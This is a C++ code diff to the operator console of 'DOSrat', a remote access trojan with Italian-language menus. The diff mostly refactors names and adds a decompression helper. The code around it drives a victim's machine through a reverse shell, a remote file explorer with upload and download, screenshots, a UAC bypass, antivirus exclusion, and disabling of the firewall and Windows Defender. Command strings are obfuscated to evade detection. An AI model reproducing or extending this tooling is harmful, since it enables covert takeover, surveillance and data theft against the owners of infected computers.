@@ -9,6 +9,47 @@ private:
     ConsoleUtils cu;
     SystemUtils su;
 
+    string decompress_string(const string& str)
+    {
+        z_stream zs;
+        memset(&zs, 0, sizeof(zs));
+
+        if (inflateInit(&zs) != Z_OK)
+            throw(std::runtime_error("inflateInit failed while decompressing."));
+
+        zs.next_in = (Bytef*)str.data();
+        zs.avail_in = str.size();
+
+        std::vector<char> outbuffer(32768, 0); // Output buffer with initial size of 32KB
+        std::string outstring;
+
+        do {
+            zs.next_out = reinterpret_cast<Bytef*>(outbuffer.data());
+            zs.avail_out = outbuffer.size();
+
+            int ret = inflate(&zs, 0);
+            if (ret == Z_STREAM_ERROR) {
+                inflateEnd(&zs);
+                throw(std::runtime_error("Exception during zlib decompression."));
+            }
+
+            // Calculate the number of bytes written to the buffer
+            std::size_t bytes_written = outbuffer.size() - zs.avail_out;
+
+            // append the block to the output string
+            outstring.append(outbuffer.data(), bytes_written);
+
+            // Resize the buffer if more space is available
+            if (zs.avail_out == 0)
+                outbuffer.resize(outbuffer.size() * 2);
+
+        } while (zs.avail_out == 0);
+
+        inflateEnd(&zs);
+
+        return outstring;
+    }
+
     bool CheckConnection()
     {
         TextColor tc;
@@ -32,7 +73,7 @@ private:
         tc.SetColor(tc.Default);
 
         Clients[ID].Kill();
-        Clu->AggiornaTitolo();
+        Clu.AggiornaTitolo();
 
         Sleep(2000);
         return false;
@@ -51,7 +92,7 @@ private:
         COORD oldPos = cu.GetCursorPos();
         cli.OneCharBar();
 
-        Response = COMUNICAZIONI::PingPong(Sock, "getinfo");
+        Response = Comunicazioni::PingPong(Sock, "getinfo");
 
         cli.StopBar();
         cu.SetCursorPos(oldPos);
@@ -118,7 +159,7 @@ private:
         if (TcpIP::SendString(Sock, "reconnect"))
         {
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return true;
         }
 
@@ -131,7 +172,7 @@ private:
         {
             Sleep(1000);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return true;
         }
 
@@ -181,12 +222,12 @@ private:
         }
 
         cout << "Invio file in corso..." << endl;
-        if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
+        if (Comunicazioni::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
         {
             cout << "File inviato.\n" << endl;
             Sleep(1500);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return 0;
         }
 
@@ -199,7 +240,7 @@ private:
         {
             Sleep(1000);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return true;
         }
 
@@ -212,7 +253,7 @@ private:
         {
             Sleep(1000);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return true;
         }
 
@@ -227,11 +268,11 @@ private:
 
         cout << endl;
 
-        if (COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
+        if (Comunicazioni::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
         {
             while (true)
             {
-                Path = COMUNICAZIONI::PingPong(Sock, "Get cd");
+                Path = Comunicazioni::PingPong(Sock, "Get cd");
 
                 if (Path == "")
                     return false;
@@ -246,7 +287,7 @@ private:
                 else if (StringUtils::ToLowerCase(Cmd).substr(0, 3) == "cls")
                 {
                     system("cls");
-                    StampaTitolo(1);
+                    UIutils::StampaTitolo(1);
                     cli.SubTitle("Sessione Comandi", 60, tc.Green);
                 }
                 else if (StringUtils::ToLowerCase(Cmd) == "powershell")
@@ -255,7 +296,7 @@ private:
                 }
                 else
                 {
-                    Res = COMUNICAZIONI::PingPong(Sock, Cmd);
+                    Res = Comunicazioni::PingPong(Sock, Cmd);
 
                     if (Res == "")
                         return false;
@@ -286,7 +327,7 @@ private:
             return 1;
         }
 
-        Res = COMUNICAZIONI::PingPong(Sock, "fileexplorer");
+        Res = Comunicazioni::PingPong(Sock, "fileexplorer");
 
         if (Res == "")
             return 2;
@@ -336,7 +377,7 @@ private:
                         cout << "Loading ";
                         cli.OneCharBar();
 
-                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                        Res = Comunicazioni::PingPong(Sock, j.dump());
 
                         cli.StopBar();
 
@@ -355,7 +396,7 @@ private:
                                 cout << "Loading ";
                                 cli.OneCharBar();
 
-                                Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                                Res = Comunicazioni::PingPong(Sock, j.dump());
 
                                 cli.StopBar();
 
@@ -383,7 +424,7 @@ private:
                         cout << "Loading ";
                         cli.OneCharBar();
 
-                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                        Res = Comunicazioni::PingPong(Sock, j.dump());
 
                         cli.StopBar();
 
@@ -411,7 +452,7 @@ private:
                         cout << "Loading ";
                         cli.OneCharBar();
 
-                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                        Res = Comunicazioni::PingPong(Sock, j.dump());
 
                         cli.StopBar();
 
@@ -432,7 +473,7 @@ private:
                     cout << "Loading ";
                     cli.OneCharBar();
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     cli.StopBar();
 
@@ -468,7 +509,7 @@ private:
                     cout << "Loading ";
                     cli.OneCharBar();
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     cli.StopBar();
 
@@ -501,7 +542,7 @@ private:
                     cout << "Loading ";
                     cli.OneCharBar();
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     cli.StopBar();
 
@@ -539,7 +580,7 @@ private:
                     j["OldName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                     j["NewName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + NewName;
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     if (Res == "")
                         return 2;
@@ -580,7 +621,7 @@ private:
                     cfe.UpdateContent();
                     cout << "Uploading... ";
 
-                    if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, LocalFile, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Uploading... ").size() + 2)))
+                    if (!Comunicazioni::UploadFileWithLoading(Sock, FileName, LocalFile, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Uploading... ").size() + 2)))
                         return 2;
 
                     cfe.RealignVisual();
@@ -593,7 +634,7 @@ private:
                         j.clear();
                         j["Action"] = "Refresh";
 
-                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                        Res = Comunicazioni::PingPong(Sock, j.dump());
 
                         if (Res == "")
                             return 2;
@@ -641,7 +682,7 @@ private:
                     cfe.UpdateContent();
                     cout << "Downloading... ";
 
-                    switch (COMUNICAZIONI::DownloadFileWithLoading(Sock, LocalFolder, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Downloading... ").size() + 2)))
+                    switch (Comunicazioni::DownloadFileWithLoading(Sock, LocalFolder, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Downloading... ").size() + 2)))
                     {
                         case 0:
                             cfe.RealignVisual();
@@ -689,7 +730,7 @@ private:
                     j["Action"] = "Makedir";
                     j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + DirName;
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     if (Res == "")
                         return 2;
@@ -729,7 +770,7 @@ private:
                     j["Action"] = "Makefile";
                     j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + FileName;
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     if (Res == "")
                         return 2;
@@ -799,7 +840,7 @@ private:
                     cout << "Copy in progress ";
                     cli.OneCharBar();
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     cli.StopBar();
 
@@ -830,7 +871,7 @@ private:
 
                     j["Action"] = "ChangePartition";
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     if (Res == "")
                         return 2;
@@ -857,7 +898,7 @@ private:
                     cout << "Loading ";
                     cli.OneCharBar();
 
-                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());
+                    Res = Comunicazioni::PingPong(Sock, j.dump());
 
                     cli.StopBar();
 
@@ -923,7 +964,7 @@ private:
             tc.SetColor(tc.Default);
             Sleep(1500);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return 0;
         }
         else if (Res == "NO")
@@ -941,7 +982,7 @@ private:
     {
         string Status;
 
-        Status = COMUNICAZIONI::PingPong(Sock, "invertmouse");
+        Status = Comunicazioni::PingPong(Sock, "invertmouse");
 
         if (Status == "a")
             cout << "Tasti invertiti.\n" << endl;
@@ -957,7 +998,7 @@ private:
     {
         string Status;
 
-        Status = COMUNICAZIONI::PingPong(Sock, "vibemouse");
+        Status = Comunicazioni::PingPong(Sock, "vibemouse");
 
         if (Status == "a")
             cout << "Vibrazione attivata.\n" << endl;
@@ -973,7 +1014,7 @@ private:
     {
         string Status;
 
-        Status = COMUNICAZIONI::PingPong(Sock, "addexclusion");
+        Status = Comunicazioni::PingPong(Sock, "addexclusion");
 
         if (Status == "ok")
         {
@@ -1003,7 +1044,7 @@ private:
     {
         string Status;
 
-        Status = COMUNICAZIONI::PingPong(Sock, "disablefw");
+        Status = Comunicazioni::PingPong(Sock, "disablefw");
 
         if (Status == "ok")
         {
@@ -1029,7 +1070,7 @@ private:
         string FileName = DateTime::GetDateTime('-', '_', '.') + ".jpg";
         string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;
 
-        Buff = COMUNICAZIONI::PingPong(Sock, "screenshot");
+        Buff = Comunicazioni::PingPong(Sock, "screenshot");
         if (Buff.empty())
             return false;
 
@@ -1045,13 +1086,13 @@ private:
                 schermi.push_back((string)json[i]["Nome"] + " (" + (string)json[i]["Width"] + "x" + (string)json[i]["Height"] + ")");
 
             cout << "Quale schermo vuoi acquisire?" << endl;
-            Buff = COMUNICAZIONI::PingPong(Sock, to_string(cli.MenuSingleSelQuadre(schermi)));
+            Buff = Comunicazioni::PingPong(Sock, to_string(cli.MenuSingleSelQuadre(schermi)));
             cout << endl;
         }
         else
         {
             cout << "Cattura in corso..." << endl;
-            Buff = COMUNICAZIONI::PingPong(Sock, "0");
+            Buff = Comunicazioni::PingPong(Sock, "0");
         }
 
         if (Buff.empty())
@@ -1102,7 +1143,7 @@ private:
         {
             Sleep(1000);
             Clients[ID].Kill();
-            Clu->AggiornaTitolo();
+            Clu.AggiornaTitolo();
             return true;
         }
 
@@ -1113,7 +1154,7 @@ private:
     {
         string Status;
 
-        Status = COMUNICAZIONI::PingPong(Sock, "disableav");
+        Status = Comunicazioni::PingPong(Sock, "disableav");
 
         if (Status == "ok")
         {
@@ -1142,12 +1183,12 @@ public:
         string cmd;
 
         system("cls");
-        StampaTitolo(1);
+        UIutils::StampaTitolo(1);
         cli.SubTitle("Sessione Comandi", 60, tc.Green);
 
         for (bool Controllo = true; Controllo;)
         {
-            StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
+            UIutils::StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
             getline(cin, cmd);
             cmd = StringUtils::ToLowerCase(cmd);
 
@@ -1158,39 +1199,39 @@ public:
             {
                 cout << endl;
                 cli.SubTitle("Client", 30, tc.Blue);
-                StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
-                StampaHelp("Kill\t\t", "- Termina il processo del Client.");
-                StampaHelp("Update\t\t", "- Aggiorna il Client con un eseguibile locale.");
-                StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
-                StampaHelp("Restart\t\t", "- Termina il Client e lo riavvia.");
-                StampaHelp("Reinstall\t", "- Ripete la procedura d'installazione.");
+                UIutils::StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
+                UIutils::StampaHelp("Kill\t\t", "- Termina il processo del Client.");
+                UIutils::StampaHelp("Update\t\t", "- Aggiorna il Client con un eseguibile locale.");
+                UIutils::StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
+                UIutils::StampaHelp("Restart\t\t", "- Termina il Client e lo riavvia.");
+                UIutils::StampaHelp("Reinstall\t", "- Ripete la procedura d'installazione.");
                 cout << endl;
 
                 cli.SubTitle("System", 30, tc.Lime);
-                StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
-                StampaHelp("Shutdown\t", "- Spegne il PC.");
-                StampaHelp("Reboot\t\t", "- Riavvia il PC.");
-                StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
-                StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
-                StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
-                StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
-                StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall (solo se Admin)."));
-                StampaHelp((string)AY_OBFUSCATE("DisableAV\t"), (string)AY_OBFUSCATE("- Disabilita Windows Defender (solo se Admin)."));
+                UIutils::StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
+                UIutils::StampaHelp("Shutdown\t", "- Spegne il PC.");
+                UIutils::StampaHelp("Reboot\t\t", "- Riavvia il PC.");
+                UIutils::StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
+                UIutils::StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
+                UIutils::StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
+                UIutils::StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
+                UIutils::StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall (solo se Admin)."));
+                UIutils::StampaHelp((string)AY_OBFUSCATE("DisableAV\t"), (string)AY_OBFUSCATE("- Disabilita Windows Defender (solo se Admin)."));
                 cout << endl;
 
                 cli.SubTitle("Desktop", 30, tc.SkyBlue);
-                StampaHelp("Screenshot\t", "- Scarica uno screenshot del desktop.");
+                UIutils::StampaHelp("Screenshot\t", "- Scarica uno screenshot del desktop.");
                 cout << endl;
 
                 cli.SubTitle("Fun", 30, tc.Yellow);
-                StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
-                StampaHelp("Vibemouse\t", "- Fa vibrare il puntatore del mouse.");
+                UIutils::StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
+                UIutils::StampaHelp("Vibemouse\t", "- Fa vibrare il puntatore del mouse.");
                 cout << endl;
 
                 cli.SubTitle("Utility", 30, tc.Purple);
-                StampaHelp("Exit\t", "- Torna al menu principale.");
-                StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
-                StampaHelp("Help\t", "- Mostra la lista dei comandi.");
+                UIutils::StampaHelp("Exit\t", "- Torna al menu principale.");
+                UIutils::StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
+                UIutils::StampaHelp("Help\t", "- Mostra la lista dei comandi.");
                 cout << endl;
             }
             else if (cmd == "getinfo")
@@ -1217,7 +1258,7 @@ public:
             else if (cmd == "clear" || cmd == "cls")
             {
                 system("cls");
-                StampaTitolo(1);
+                UIutils::StampaTitolo(1);
                 cli.SubTitle("Sessione Comandi", 60, tc.Green);
             }
             else if (cmd == "kill")
@@ -1272,14 +1313,14 @@ public:
             else if (cmd == "explorer")
             {
                 if (Clients[ID].info.CompatibleVer < 5)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     switch (FileExplorer())
                     {
                         case 0:
                             system("cls");
-                            StampaTitolo(1);
+                            UIutils::StampaTitolo(1);
                             cli.SubTitle("Sessione Comandi", 60, tc.Green);
                             break;
 
@@ -1288,7 +1329,7 @@ public:
 
                         case 2:
                             system("cls");
-                            StampaTitolo(1);
+                            UIutils::StampaTitolo(1);
                             cli.SubTitle("Sessione Comandi", 60, tc.Green);
 
                             Controllo = CheckConnection();
@@ -1299,7 +1340,7 @@ public:
             else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
             {
                 if (Clients[ID].info.CompatibleVer < 5)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (Clients[ID].info.UAC == "Admin")
@@ -1330,7 +1371,7 @@ public:
             else if (cmd == "vibemouse")
             {
                 if (Clients[ID].info.CompatibleVer < 3)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (!VibeMouse())
@@ -1340,7 +1381,7 @@ public:
             else if (cmd == "addavexclusion")
             {
                 if (Clients[ID].info.CompatibleVer < 4)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (Clients[ID].info.UAC == "Admin")
@@ -1355,7 +1396,7 @@ public:
             else if (cmd == (string)AY_OBFUSCATE("disablefirewall"))
             {
                 if (Clients[ID].info.CompatibleVer < 4)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (Clients[ID].info.UAC == "Admin")
@@ -1370,7 +1411,7 @@ public:
             else if (cmd == "screenshot")
             {
                 if (Clients[ID].info.CompatibleVer < 5)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (!Screenshot())
@@ -1380,7 +1421,7 @@ public:
             else if (cmd == "reinstall")
             {
                 if (Clients[ID].info.CompatibleVer < 5)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (!Reinstall())
@@ -1392,7 +1433,7 @@ public:
             else if (cmd == (string)AY_OBFUSCATE("disableav"))
             {
                 if (Clients[ID].info.CompatibleVer < 5)
-                    StampaIncompatibile();
+                    UIutils::StampaIncompatibile();
                 else
                 {
                     if (Clients[ID].info.UAC == "Admin")
